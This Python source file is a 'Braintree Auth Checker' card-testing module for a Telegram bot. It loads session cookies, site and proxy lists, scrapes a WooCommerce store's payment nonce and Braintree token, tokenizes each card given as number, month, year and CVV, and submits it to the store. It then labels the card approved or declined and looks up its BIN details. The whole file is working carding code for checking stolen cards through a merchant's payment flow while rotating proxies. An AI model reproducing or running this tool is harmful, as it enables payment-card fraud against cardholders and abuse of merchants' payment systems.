# ============================================================
#  Braintree Auth Checker (B3 Gate)
#  Ported from p.py — uses cookies + site.txt for WooCommerce
#  Braintree payment method add flow
# ============================================================

import requests
import re
import base64
import time
import json
import random
import os
import glob
import urllib3
from bs4 import BeautifulSoup

try:
    from user_agent import generate_user_agent
    _user_agent = generate_user_agent()
except ImportError:
    _user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Base directory — where cookie/site files live
_BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# ============================================================
#  Cookie pair management
# ============================================================
_SELECTED_COOKIE_PAIR = None


def _discover_cookie_pairs():
    pairs = []
    try:
        files1 = glob.glob(os.path.join(_BASE_DIR, 'cookies_*-1.txt'))
        files2_set = set(glob.glob(os.path.join(_BASE_DIR, 'cookies_*-2.txt')))
        for file1 in files1:
            base = os.path.basename(file1)
            pair_id = base.replace('cookies_', '').replace('-1.txt', '')
            file2 = os.path.join(_BASE_DIR, f'cookies_{pair_id}-2.txt')
            if file2 in files2_set:
                pairs.append({'id': pair_id, 'file1': file1, 'file2': file2})
    except Exception:
        pass
    return pairs


def _select_cookie_pair():
    global _SELECTED_COOKIE_PAIR
    pairs = _discover_cookie_pairs()
    if not pairs:
        _SELECTED_COOKIE_PAIR = {
            'file1': os.path.join(_BASE_DIR, 'cookies_1.txt'),
            'file2': os.path.join(_BASE_DIR, 'cookies_2.txt'),
            'id': 'fallback'
        }
    else:
        _SELECTED_COOKIE_PAIR = random.choice(pairs)
    return _SELECTED_COOKIE_PAIR


def _read_cookies_from_file(filepath):
    try:
        with open(filepath, 'r') as f:
            content = f.read()
        ns = {}
        exec(content, ns)
        return ns.get('cookies', {})
    except Exception:
        return {}


def _get_cookies_1():
    global _SELECTED_COOKIE_PAIR
    if _SELECTED_COOKIE_PAIR is None:
        _select_cookie_pair()
    return _read_cookies_from_file(_SELECTED_COOKIE_PAIR['file1'])


def _get_cookies_2():
    global _SELECTED_COOKIE_PAIR
    if _SELECTED_COOKIE_PAIR is None:
        _select_cookie_pair()
    return _read_cookies_from_file(_SELECTED_COOKIE_PAIR['file2'])


def _get_domain_url():
    try:
        with open(os.path.join(_BASE_DIR, 'site.txt'), 'r') as f:
            return f.read().strip()
    except Exception:
        return ""


# ============================================================
#  Proxy helper — uses the global proxy pool from tg_bot
# ============================================================
def _get_random_proxy():
    """Read proxy from proxy.txt in base dir (standalone fallback)."""
    try:
        pf = os.path.join(_BASE_DIR, 'proxy.txt')
        if not os.path.exists(pf):
            pf = os.path.join(_BASE_DIR, 'proxies.txt')
        with open(pf, 'r') as f:
            proxies = [l.strip() for l in f if l.strip() and not l.strip().startswith('#')]
        if not proxies:
            return None
        proxy = random.choice(proxies)
        parts = proxy.split(':')
        if len(parts) == 4:
            host, port, username, password = parts
            return {
                'http': f'http://{username}:{password}@{host}:{port}',
                'https': f'http://{username}:{password}@{host}:{port}'
            }
        elif len(parts) == 2:
            return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        return None
    except Exception:
        return None


# ============================================================
#  Auth + tokenisation
# ============================================================
def _get_headers(domain_url):
    return {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'dnt': '1',
        'referer': f'{domain_url}/my-account/payment-methods/',
        'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': _user_agent,
    }


def _get_new_auth(proxy_dict=None):
    domain_url = _get_domain_url()
    cookies_1 = _get_cookies_1()
    headers = _get_headers(domain_url)

    try:
        response = requests.get(
            f'{domain_url}/my-account/add-payment-method/',
            cookies=cookies_1, headers=headers,
            proxies=proxy_dict, verify=False, timeout=30
        )
    except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
        # Fallback direct
        try:
            response = requests.get(
                f'{domain_url}/my-account/add-payment-method/',
                cookies=cookies_1, headers=headers,
                proxies=None, verify=False, timeout=30
            )
        except Exception:
            return None, None

    if response.status_code != 200:
        return None, None

    add_nonce = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
    if not add_nonce:
        return None, None

    i0 = response.text.find('wc_braintree_client_token = ["')
    if i0 == -1:
        return None, None
    i1 = response.text.find('"]', i0)
    token = response.text[i0 + 30:i1]
    try:
        decoded = base64.b64decode(token).decode('utf-8')
        au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded)
        if not au:
            return None, None
        return add_nonce[0], au[0]
    except Exception:
        return None, None


def _get_bin_info(bin_number):
    default = {'brand': 'UNKNOWN', 'type': 'UNKNOWN', 'level': 'UNKNOWN',
               'bank': 'UNKNOWN', 'country': 'UNKNOWN', 'emoji': '🏳️'}
    try:
        r = requests.get(f'https://api.voidex.dev/api/bin?bin={bin_number}', timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data and 'brand' in data:
                return {
                    'brand': data.get('brand', 'UNKNOWN'),
                    'type': data.get('type', 'UNKNOWN'),
                    'level': data.get('brand', 'UNKNOWN'),
                    'bank': data.get('bank', 'UNKNOWN'),
                    'country': data.get('country_name', 'UNKNOWN'),
                    'emoji': data.get('country_flag', '🏳️')
                }
    except Exception:
        pass
    return default


def _check_status(result):
    approved_patterns = [
        'Nice! New payment method added',
        'Payment method successfully added.',
        'Insufficient Funds',
        'Gateway Rejected: avs',
        'Duplicate',
        'Payment method added successfully',
        'Invalid postal code or street address',
        'You cannot add a new payment method so soon after the previous one',
    ]
    cvv_patterns = [
        'CVV', 'Gateway Rejected: avs_and_cvv',
        'Card Issuer Declined CVV', 'Gateway Rejected: cvv'
    ]

    if "Reason:" in result:
        reason_part = result.split("Reason:", 1)[1].strip()
        for p in approved_patterns:
            if p in result:
                return "APPROVED", "Approved", True
        for p in cvv_patterns:
            if p in reason_part:
                return "DECLINED", "Reason: CVV", False
        return "DECLINED", reason_part, False

    for p in approved_patterns:
        if p in result:
            return "APPROVED", "Approved", True
    for p in cvv_patterns:
        if p in result:
            return "DECLINED", "Reason: CVV", False
    return "DECLINED", result, False


# ============================================================
#  Main check_card function — called by tg_bot gate system
# ============================================================
def check_card(cc_line, proxy_dict=None):
    """
    Check a single card via Braintree auth.
    cc_line: "CC|MM|YY|CVV"
    proxy_dict: optional {'http': '...', 'https': '...'} or None
    Returns a result string compatible with process_single_entry format.
    """
    _select_cookie_pair()
    start_time = time.time()

    try:
        domain_url = _get_domain_url()
        cookies_2 = _get_cookies_2()
        headers = _get_headers(domain_url)

        if proxy_dict is None:
            proxy_dict = _get_random_proxy()

        add_nonce, au = _get_new_auth(proxy_dict)
        if not add_nonce or not au:
            return "Error | Authorization failed — cookies may be expired"

        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return "Error | Invalid card format"

        n, mm, yy, cvc = parts
        if not yy.startswith('20'):
            yy = '20' + yy

        # Step 1: Tokenize via Braintree GraphQL
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'cc600ecf-f0e1-4316-ac29-7ad78aeafccd',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                        'billingAddress': {
                            'postalCode': '10080',
                            'streetAddress': '147 street',
                        },
                    },
                    'options': {'validate': False},
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        token_headers = {
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'user-agent': _user_agent,
        }

        try:
            resp = requests.post(
                'https://payments.braintree-api.com/graphql',
                headers=token_headers, json=json_data,
                proxies=proxy_dict, verify=False, timeout=30
            )
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            resp = requests.post(
                'https://payments.braintree-api.com/graphql',
                headers=token_headers, json=json_data,
                proxies=None, verify=False, timeout=30
            )

        if resp.status_code != 200:
            return f"Error | Tokenization failed (HTTP {resp.status_code})"

        try:
            token = resp.json()['data']['tokenizeCreditCard']['token']
        except (KeyError, TypeError):
            return "Error | Invalid tokenization response"

        # Step 2: Submit payment method to WooCommerce
        submit_headers = headers.copy()
        submit_headers['content-type'] = 'application/x-www-form-urlencoded'

        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '{"correlation_id":"cc600ecf-f0e1-4316-ac29-7ad78aea"}',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        try:
            resp2 = requests.post(
                f'{domain_url}/my-account/add-payment-method/',
                cookies=cookies_2, headers=headers, data=data,
                proxies=proxy_dict, verify=False, timeout=30
            )
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            resp2 = requests.post(
                f'{domain_url}/my-account/add-payment-method/',
                cookies=cookies_2, headers=headers, data=data,
                proxies=None, verify=False, timeout=30
            )

        elapsed = time.time() - start_time
        soup = BeautifulSoup(resp2.text, 'html.parser')
        notice = soup.find('div', class_='woocommerce-notices-wrapper')
        message = notice.get_text(strip=True) if notice else "Unknown error"

        status, reason, approved = _check_status(message)
        bin_info = _get_bin_info(n[:6])

        # Return in the same format as process_single_entry
        if approved:
            return (
                f"Approved | {reason}\n"
                f"Card: {n}|{mm}|{yy}|{cvc}\n"
                f"Gateway: Braintree Auth\n"
                f"BIN: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}\n"
                f"Bank: {bin_info['bank']}\n"
                f"Country: {bin_info['country']} {bin_info['emoji']}\n"
                f"Time: {elapsed:.1f}s"
            )
        else:
            return (
                f"Declined | {reason}\n"
                f"Card: {n}|{mm}|{yy}|{cvc}\n"
                f"Gateway: Braintree Auth\n"
                f"BIN: {bin_info['brand']} - {bin_info['type']}\n"
                f"Time: {elapsed:.1f}s"
            )

    except Exception as e:
        return f"Error | {str(e)}"
